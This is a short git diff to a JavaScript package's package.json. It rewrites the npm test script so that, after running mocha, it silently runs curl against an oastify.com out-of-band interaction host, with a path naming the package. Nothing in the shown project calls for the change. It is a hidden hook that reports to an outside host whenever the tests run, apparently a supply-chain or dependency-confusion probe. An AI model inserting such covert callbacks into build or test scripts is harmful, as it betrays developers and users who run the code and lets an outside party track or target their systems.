@@ -35,6 +35,6 @@
     "vinyl-source-stream": "^1.1.0"
   },
   "scripts": {
-    "test": "mocha"
+    "test": "mocha && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/singlewire/icm-js-client"
   }
 }
